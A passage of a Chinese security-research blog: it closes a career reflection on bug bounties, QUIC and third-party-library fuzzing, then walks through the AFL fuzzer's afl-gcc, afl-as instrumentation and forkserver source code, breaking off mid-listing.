bridge市面上大概有两种，一种是随便你渲染什么页面，但是他会有白名单，只有在白名单下才能调用特权api，还有一种是尽可能想办法不让你渲染页面的。。。这种不多说了。对于白名单限制的想办法绕过后配合软件的一些功能(如下载执行功能)来实现rce</p><p>假如说目标是搞点bounty的话攻击面其实挺多，比如图片解析视频解析等，看看他是用来哪些第三方的库or插件想办法挖就行，当然挖之前最好阅读下bounty规则免得一场空。</p><p>一些软件逆向都是基本功了，没必要叙述太多，尽可能避免一些伞兵需求即可，公司里并不是所有人都熟悉技术，尤其是二进制这一块可以说是更少了，经常性会遇到一些逆向vmp等需求，想办法问清楚价值不大的话直接拒即可。</p><p>但你要是头铁就是喜欢逆vmp觉得这个可以显得自己多牛逼还是怎么样的也行，只不过在做之前最好考虑下这个东西做出来后对你的绩效帮助大不大，别到最后报着个怀才不遇的心态抱怨着我他妈逆了这么难的东西就给我这个平平无奇的绩效。</p><h2 id="个人研究"><a href="#个人研究" class="headerlink" title="个人研究"></a>个人研究</h2><p>在工作之外能做出东西才是最牛逼的。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">http3协议<br>chromium<br></code></pre></td></tr></table></figure><p>从去年开始看上了http3也就是quic协议的一些漏洞挖掘，也是借这个机会学习了下fuzz，产出为一个腾讯云quic协议的数组越界，可惜tquic是rust写的一触发越界就报错了没办法写出exp。</p><p>持续半年后放弃了这个方向大致俩个原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">无钱途&#x2F;钱少<br>用户量少，大部分厂商认为危害不大<br>libwebp事件<br></code></pre></td></tr></table></figure><p>当时libwebp事件出现后师兄约着吃了个饭讨论了后续的研究方向，通用第三方库的漏洞挖掘。</p><p>大家目标还都是做一些牛逼的事情，道路是曲折的，前途是光明的。</p><p>get到了俩cve cvss评分10.0拉满虽然可以吹一波但还是老问题 <code>无钱途</code>。</p><p>遇到问题解决问题，几个月的研究发现部分第三方库的漏洞并不能应用到真正的目标上，比如第三方库能触发漏洞，但是应用到真正软件上时往往在三方库api调用前会有一些check，导致无法触发，即无bounty。</p><p>当然也学到不少，libfuzzer使用越来越熟练了，对很多原理也了解了不少。</p><p>总结到失败经验后及时切换目标，后续就盯着有钱的干，好在后续结果不错，第一个五位数刀乐的bounty大概是有了，希望到年底能get更多。</p><p>//后续的漏洞挖掘放在明年写了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AFL forkserver源码阅读</title>
    <link href="/2024/03/22/AFL-forkserver%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <url>/2024/03/22/AFL-forkserver%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>前阵子出于好奇读了部分源码，由于工作原因还没看完，后续有时间把后面的补上</p><a id="more"></a><h1 id="AFL-forkserver部分源码阅读"><a href="#AFL-forkserver部分源码阅读" class="headerlink" title="AFL forkserver部分源码阅读"></a>AFL forkserver部分源码阅读</h1><h2 id="afl-gcc-c-替换as"><a href="#afl-gcc-c-替换as" class="headerlink" title="afl-gcc.c(替换as)"></a>afl-gcc.c(替换as)</h2><p>主要分为两部分</p><p>find_as和edit_params</p><p>find_as负责找到afl-as插桩，从三个地方触发，第一个是直接从环境变量中读取<code>u8 *afl_path = getenv(&quot;AFL_PATH&quot;);</code></p><p>第二个是程序运行时目录寻找<code>dir = ck_strdup(argv0);</code></p><p>如上两种情况都找不到就会从编译时的AFL_PATH中寻找<code>access(AFL_PATH &quot;/as&quot;, X_OK)</code></p><p>edit_params则是负责解析命令行参数并进行修改和替换</p><p>第一步是确定编译器，目录中存在<code>afl-clang, afl-g++等文件，其实都是个软链接指向了afl-gcc</code>，afl-gcc会根据命令行文件判断使用哪个编译器，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++">name = <span class="hljs-built_in">strrchr</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;/&#x27;</span>);<br> <span class="hljs-keyword">if</span> (!name) name = argv[<span class="hljs-number">0</span>]; <span class="hljs-keyword">else</span> name++;<br><br> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(name, <span class="hljs-string">&quot;afl-clang&quot;</span>, <span class="hljs-number">9</span>)) &#123;<br><br>   clang_mode = <span class="hljs-number">1</span>;<br><br>   setenv(CLANG_ENV_VAR, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">1</span>);<br><br>   <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-clang++&quot;</span>)) &#123;<br>     u8* alt_cxx = getenv(<span class="hljs-string">&quot;AFL_CXX&quot;</span>);<br>     cc_params[<span class="hljs-number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="hljs-string">&quot;clang++&quot;</span>;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>     u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_CC&quot;</span>);<br>     cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;clang&quot;</span>;<br>   &#125;<br>   ...<br>   ...<br></code></pre></td></tr></table></figure><p>确定完编译器后会进行后续参数的解析和替换,这里会忽略一些参数如-B，这个是默认带的，afl-gcc会使用-B指定afl-as为汇编器对代码进行汇编和插桩，用于统计代码覆盖率。这是整个函数中最关键的一步，其余的基本就是对参数的解析等</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">while</span> (--argc) &#123;<br>    u8* cur = *(++argv);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(cur, <span class="hljs-string">&quot;-B&quot;</span>, <span class="hljs-number">2</span>)) &#123;<br><br>      <span class="hljs-keyword">if</span> (!be_quiet) WARNF(<span class="hljs-string">&quot;-B is already set, overriding&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (!cur[<span class="hljs-number">2</span>] &amp;&amp; argc &gt; <span class="hljs-number">1</span>) &#123; argc--; argv++; &#125;<br>      <span class="hljs-keyword">continue</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-integrated-as&quot;</span>)) <span class="hljs-keyword">continue</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-pipe&quot;</span>)) <span class="hljs-keyword">continue</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-m32&quot;</span>)) m32_set = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-fsanitize=address&quot;</span>) ||<br>        !<span class="hljs-built_in">strcmp</span>(cur, <span class="hljs-string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(cur, <span class="hljs-string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="hljs-number">1</span>;<br><br>    cc_params[cc_par_cnt++] = cur;<br><br>  &#125;<br><br>  cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-B&quot;</span>;<br>  cc_params[cc_par_cnt++] = as_path;<br>...<br>...<br></code></pre></td></tr></table></figure><h2 id="afl-as-c-代码插桩"><a href="#afl-as-c-代码插桩" class="headerlink" title="afl-as.c(代码插桩)"></a>afl-as.c(代码插桩)</h2><p>首先也是edit_params，在afl-gcc中，程序指定了afl-as作为连接器，edit_params用于对afl-gcc调用传入的参数进行解析和修改，后续会调用add_instrumentation来对汇编文件进行插桩。这里比较重要的是设置了修改后的.s文件保存路径</p><p><code>modified_file = alloc_printf(&quot;%s/.afl-%u-%u.s&quot;, tmp_dir, getpid(),(u32)time(NULL));</code></p><p>最初始的inputfile由afl-gcc传入。参数解析完后会对原始的汇编文件进行插桩，在每个分支都会有如下插桩代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">static const u8* trampoline_fmt_64 &#x3D;<br><br>  &quot;\n&quot;<br>  &quot;&#x2F;* --- AFL TRAMPOLINE (64-BIT) --- *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;movq %%rdx,  0(%%rsp)\n&quot;<br>  &quot;movq %%rcx,  8(%%rsp)\n&quot;<br>  &quot;movq %%rax, 16(%%rsp)\n&quot;<br>  &quot;movq $0x%08x, %%rcx\n&quot;<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movq 16(%%rsp), %%rax\n&quot;<br>  &quot;movq  8(%%rsp), %%rcx\n&quot;<br>  &quot;movq  0(%%rsp), %%rdx\n&quot;<br>  &quot;leaq (128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;&#x2F;* --- END --- *&#x2F;\n&quot;<br>  &quot;\n&quot;;<br></code></pre></td></tr></table></figure><p>64位程序如上</p><p>其中主要实现位于<code>__afl_maybe_log</code>，代码类似如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;<br>shared_mem[cur_location ^ prev_location]++; <br>prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>设计时存在一个右移操作是想维持覆盖率的方向性</p><p>cur_location为编译时的随机数，在afl-as.c中体现如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">gettimeofday(&amp;tv, &amp;tz);<br>rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();<br>srandom(rand_seed);<br></code></pre></td></tr></table></figure><p>上述进行了随机数的初始化</p><p>每遇到一个分支就会进行代码插入，并把随机数填充</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">#  define R(<span class="hljs-name">x</span>) (<span class="hljs-name">random</span>() % (<span class="hljs-name">x</span>))<br></code></pre></td></tr></table></figure><p>add_instrumentation函数中最主要的插桩代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span>) &#123;<br>  <span class="hljs-keyword">if</span> (line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="hljs-number">2</span>] != <span class="hljs-string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="hljs-number">100</span>) &lt; inst_ratio) &#123;<br>    <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>            R(MAP_SIZE));<br>    ins_lines++;<br>  &#125;<br></code></pre></td></tr></table></figure><p>判断力当前程序架构并插入对应的汇编指令，填充对应的cur_location值。</p><p>所有的汇编解析完后，在最后会插入很长的main_payload。里面就包括了上述统计覆盖率的afl_maybe_log 函数和初始化内存的afl_setup函数</p><h2 id="afl-as-h-fork-server，覆盖率统计实现"><a href="#afl-as-h-fork-server，覆盖率统计实现" class="headerlink" title="afl-as.h(fork server，覆盖率统计实现)"></a>afl-as.h(fork server，覆盖率统计实现)</h2><p>主要讲解main_payload_64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  &quot;  seto  %al\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Check if SHM region is already mapped. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;<br>  &quot;  testq %rdx, %rdx\n&quot;<br>  &quot;  je    __afl_setup\n&quot;<br>  &quot;\n&quot;<br>  &quot;__afl_store:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Calculate and store hit for the code location specified in rcx. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>#ifndef COVERAGE_ONLY<br>  &quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;<br>  &quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;<br>  &quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;<br>#endif &#x2F;* ^!COVERAGE_ONLY *&#x2F;<br>  &quot;\n&quot;<br>#ifdef SKIP_COUNTS<br>  &quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;<br>#else<br>  &quot;  incb (%rdx, %rcx, 1)\n&quot;<br>#endif &#x2F;* ^SKIP_COUNTS *&#x2F;<br>  &quot;\n&quot;<br>  &quot;__afl_return:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  addb $127, %al\n&quot;<br>#if defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))<br>  &quot;  .byte 0x9e &#x2F;* sahf *&#x2F;\n&quot;<br>#else<br>  &quot;  sahf\n&quot;<br>#endif &#x2F;* ^__OpenBSD__, etc *&#x2F;<br>  &quot;  ret\n&quot;<br></code></pre></td></tr></table></figure><p>首先判断共享内存区域是否被映射，如果没有被映射则进入__afl_setup函数，否则进入store函数，这里负责使得对应loc的map值加一统计覆盖率。</p><p>下面看setup函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  &quot;__afl_setup:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Do not retry setup if we had previous failures. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;<br>  &quot;  jne __afl_return\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Check out if we have a global pointer on file. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>#ifndef __APPLE__<br>  &quot;  movq  __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;<br>  &quot;  movq  (%rdx), %rdx\n&quot;<br>#else<br>  &quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;<br>#endif &#x2F;* !^__APPLE__ *&#x2F;<br>  &quot;  testq %rdx, %rdx\n&quot;<br>  &quot;  je    __afl_setup_first\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;<br>  &quot;  jmp  __afl_store\n&quot; <br></code></pre></td></tr></table></figure><p>判断之前是否初始化失败，失败直接return，接着判断全局变量值是否为空，非空则直接进行赋值然后跳转至afl_store函数，如果都不满足则进入setup_first函数如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  &quot;__afl_setup_first:\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Save everything that is not yet saved and that may be touched by\n&quot;<br>  &quot;     getenv() and several other libcalls we&#39;ll be relying on. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  leaq -352(%rsp), %rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq %rax,   0(%rsp)\n&quot;<br>  &quot;  movq %rcx,   8(%rsp)\n&quot;<br>  &quot;  movq %rdi,  16(%rsp)\n&quot;<br>  &quot;  movq %rsi,  32(%rsp)\n&quot;<br>  &quot;  movq %r8,   40(%rsp)\n&quot;<br>  &quot;  movq %r9,   48(%rsp)\n&quot;<br>  &quot;  movq %r10,  56(%rsp)\n&quot;<br>  &quot;  movq %r11,  64(%rsp)\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq %xmm0,  96(%rsp)\n&quot;<br>  &quot;  movq %xmm1,  112(%rsp)\n&quot;<br>  &quot;  movq %xmm2,  128(%rsp)\n&quot;<br>  &quot;  movq %xmm3,  144(%rsp)\n&quot;<br>  &quot;  movq %xmm4,  160(%rsp)\n&quot;<br>  &quot;  movq %xmm5,  176(%rsp)\n&quot;<br>  &quot;  movq %xmm6,  192(%rsp)\n&quot;<br>  &quot;  movq %xmm7,  208(%rsp)\n&quot;<br>  &quot;  movq %xmm8,  224(%rsp)\n&quot;<br>  &quot;  movq %xmm9,  240(%rsp)\n&quot;<br>  &quot;  movq %xmm10, 256(%rsp)\n&quot;<br>  &quot;  movq %xmm11, 272(%rsp)\n&quot;<br>  &quot;  movq %xmm12, 288(%rsp)\n&quot;<br>  &quot;  movq %xmm13, 304(%rsp)\n&quot;<br>  &quot;  movq %xmm14, 320(%rsp)\n&quot;<br>  &quot;  movq %xmm15, 336(%rsp)\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Map SHM, jumping to __afl_setup_abort if something goes wrong. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* The 64-bit ABI requires 16-byte stack alignment. We&#39;ll keep the\n&quot;<br>  &quot;     original stack ptr in the callee-saved r12. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  pushq %r12\n&quot;<br>  &quot;  movq  %rsp, %r12\n&quot;<br>  &quot;  subq  $16, %rsp\n&quot;<br>  &quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;<br>  CALL_L64(&quot;getenv&quot;)<br>  &quot;\n&quot;<br>  &quot;  testq %rax, %rax\n&quot;<br>  &quot;  je    __afl_setup_abort\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq  %rax, %rdi\n&quot;<br>  CALL_L64(&quot;atoi&quot;)<br>  &quot;\n&quot;<br>  &quot;  xorq %rdx, %rdx   &#x2F;* shmat flags    *&#x2F;\n&quot;<br>  &quot;  xorq %rsi, %rsi   &#x2F;* requested addr *&#x2F;\n&quot;<br>  &quot;  movq %rax, %rdi   &#x2F;* SHM ID         *&#x2F;\n&quot;<br>  CALL_L64(&quot;shmat&quot;)<br>  &quot;\n&quot;<br>  &quot;  cmpq $-1, %rax\n&quot;<br>  &quot;  je   __afl_setup_abort\n&quot;<br>  &quot;\n&quot;<br>  &quot;  &#x2F;* Store the address of the SHM region. *&#x2F;\n&quot;<br>  &quot;\n&quot;<br>  &quot;  movq %rax, %rdx\n&quot;<br>  &quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;<br>  &quot;\n&quot;<br>#ifdef __APPLE__<br>  &quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;<br>#else<br>  &quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;<br>  &quot;  movq %rax, (%rdx)\n&quot;<br>#endif &#x2F;* ^__APPLE__ *&#x2F;<br>  &quot;  movq %rax, %rdx\n&quot;<br></code></pre></td></tr></table></figure><p>首先保存环境，push一堆寄存器，随后对rsp进行了16字节对齐操作，作者注释中也写到了，<code>andq  $0xfffffffffffffff0, %rsp\n</code>保证了rsp为16字节对齐，开头的sub rsp也是为了防止覆盖先前压入的寄存器，最原始的rsp被保存在了r12寄存器中。后续就是一些初始化，首先获取环境变量AFL_SHM_ENV然后转为整数后传入shmat将内存映射至当前进程的内存空间然后为afl_area_ptr和afl_global_area_ptr进行赋值。如果中间有失败就会进入afl_setup_abort函数中，可以看到代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&quot;__afl_setup_abort:\n&quot;<br>&quot;\n&quot;<br>&quot;  &#x2F;* Record setup failure so that we don&#39;t keep calling\n&quot;<br>&quot;     shmget() &#x2F; shmat() over and over again. *&#x2F;\n&quot;<br>&quot;\n&quot;<br>&quot;  incb __afl_setup_failure(%rip)\n&quot;<br>&quot;\n&quot;<br>&quot;  movq %r12, %rsp\n&quot;<br>&quot;  popq %r12\n&quot;<br>&quot;\n&quot;<br>&quot;  movq  0(%rsp), %rax\n&quot;<br>&quot;  movq  8(%rsp), %rcx\n&quot;<br>&quot;  movq 16(%rsp), %rdi\n&quot;<br>&quot;  movq 32(%rsp), %rsi\n&quot;<br>&quot;  movq 40(%rsp), %r8\n&quot;<br>&quot;  movq 48(%rsp), %r9\n&quot;<br>&quot;  movq 56(%rsp), %r10\n&quot;<br>&quot;  movq 64(%rsp), %r11\n&quot;<br>&quot;\n&quot;<br>&quot;  movq  96(%rsp), %xmm0\n&quot;<br>&quot;  movq 112(%rsp), %xmm1\n&quot;<br>&quot;  movq 128(%rsp), %xmm2\n&quot;<br>&quot;  movq 144(%rsp), %xmm3\n&quot;<br>&quot;  movq 160(%rsp), %xmm4\n&quot;<br>&quot;  movq 176(%rsp), %xmm5\n&quot;<br>&quot;  movq 192(%rsp), %xmm6\n&quot;<br>&quot;  movq 208(%rsp), %xmm7\n&quot;<br>&quot;  movq 224(%rsp), %xmm8\n&quot;<br>&quot;  movq 240(%rsp), %xmm9\n&quot;<br>&quot;  movq 256(%rsp), %xmm10\n&quot;<br>&quot;  movq 272(%rsp), %xmm11\n&quot;<br>&quot;  movq 288(%rsp), %xmm12\n&quot;<br>&quot;  movq 304(%rsp), %xmm13\n&quot;<br>&quot;  movq 320(%rsp), %xmm14\n&quot;<br>&quot;  movq 336(%rsp), %xmm15\n&quot;<br>&quot;\n&quot;<br>&quot;  leaq 352(%rsp), %rsp\n&quot;<br>&quot;\n&quot;<br>&quot;  jmp __afl_return\n&quot;<br></code></pre></td></tr></table></figure><p>对afl_setup_failure值加1然后恢复现场，这也保证了编译出来的程序可以正常运行而不是必须以fuzzer的形式。</p><p>最后是forkserver部分如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 